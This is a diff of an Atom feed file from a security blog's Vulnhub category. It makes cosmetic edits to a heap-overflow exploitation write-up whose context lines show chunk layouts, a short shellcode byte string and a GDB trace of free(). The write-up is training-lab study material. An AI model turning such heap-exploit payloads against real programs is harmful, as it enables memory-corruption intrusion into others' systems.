@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-07-04T15:02:46+02:00</updated>
+  <updated>2015-07-04T15:03:35+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -1378,7 +1378,7 @@ but jumping to our shellcode stored in allocated memory would be efficient.</p>
 </span><span class='line'>
 </span><span class='line'><span class="sr">&lt;h1&gt;chunk1&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
 </span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">argv1</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">XXXX</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                        <span class="c1"># user data, later overwritten by second free(), so we skip this place</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">argv1</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">XXXX</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                        <span class="c1"># user data, later overwritten by second free()</span>
 </span><span class='line'><span class="n">argv1</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x68</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">x88</span><span class="p">\</span><span class="n">x04</span><span class="p">\</span><span class="n">x08</span><span class="p">\</span><span class="n">xc3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c1"># shellcode&lt;/p&gt;</span>
 </span><span class='line'>
 </span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">chunk2</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
@@ -1442,7 +1442,7 @@ triggered the following part of pseudocode with the first <code>free()</code>:</
 </span><span class='line'>&lt;p>0x8049918 &lt;free+244>:   mov    eax,DWORD PTR [ebp-0x24] ; size = 0xfffffff8 = -8
 </span><span class='line'>0x804991b &lt;free+247>:   mov    edx,DWORD PTR [ebp-0x28] ; DEFG &hellip;</span></code></pre></td></tr></table></div></figure></p>
 
-<p>Here at the position <code>-0x8-0x4=0xc</code> from <code>p</code> the <code>PREV_INUSE</code> flag is set, so we skip
+<p>Here at the position <code>-0x8-0x4=0xc</code> from <code>p</code> the <code>PREV_INUSE</code> flag is set, so we skipped
 the forward consolidation:</p>
 
 <p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
